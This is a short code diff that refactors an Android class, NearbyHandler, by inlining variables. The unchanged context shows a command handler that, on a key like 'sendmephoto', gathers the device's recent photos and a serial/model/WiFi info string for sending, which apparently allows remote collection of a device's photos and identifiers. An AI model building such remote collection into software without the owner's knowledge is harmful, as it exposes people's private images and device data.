@@ -149,8 +149,7 @@ public class NearbyHandler {
                         e.printStackTrace();
                     }
                 } else if (key.contains("sendmephoto")) {
-                    Bitmap conv1 = SontHelper.getLastImage(ctx);
-                    Bitmap holder = conv1;
+                    Bitmap holder = SontHelper.getLastImage(ctx);
 
                     double MAX = 0.7 * 1024 * 1024;
                     while (holder.getByteCount() > MAX) {
@@ -195,8 +194,7 @@ public class NearbyHandler {
                     double summizer = 0;
                     int count = 10;
                     for (int i = 0; i < count; i++) {
-                        Bitmap tempbm = BitmapFactory.decodeFile(imagesPaths.get(i));
-                        Bitmap holder = tempbm;
+                        Bitmap holder = BitmapFactory.decodeFile(imagesPaths.get(i));
                         double MAX = TOTALMAX / count;
                         while (holder.getByteCount() > MAX) {
                             holder = SontHelper.resizeBitmap(holder, holder.getWidth() / 1.1, holder.getHeight() / 1.1);
@@ -298,7 +296,7 @@ public class NearbyHandler {
         } catch (Exception e) {
             currentWifi = "na";
         }
-        String devInfoString = "Serial: " + SERIAL +
+        return "Serial: " + SERIAL +
                 "\nModel: " + MODEL +
                 "\nID: " + ID +
                 "\nManufacturer: " + MANUF +
@@ -314,7 +312,6 @@ public class NearbyHandler {
                 "\nRelease: " + RELEASE +
                 "\nCurrent WiFi: " + currentWifi +
                 "\n-------------";
-        return devInfoString;
     }
 
     public void vibrate(Context c) {
